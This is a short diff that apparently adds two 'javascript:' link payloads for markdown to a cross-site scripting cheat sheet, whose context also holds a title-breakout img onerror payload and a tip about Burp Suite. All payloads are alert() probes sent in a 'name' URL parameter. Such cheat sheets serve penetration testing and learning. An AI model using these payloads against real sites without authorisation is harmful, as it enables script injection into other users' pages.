@@ -30,5 +30,10 @@
 - __`/?name=test123</title><img/src=x onerror=alert(2)>`__
 
 
+#### for markdown
+- __`/?name=[test123](javascript://alert'')`__
+- __`/?name=[test123](javascript:alert'')`__
+
+
 - > __If you are not getting /?name=test123 in url you can use burpsuite__
   - ![image1](https://github.com/Chittu13/All_in_one/blob/main/image/image1.png)
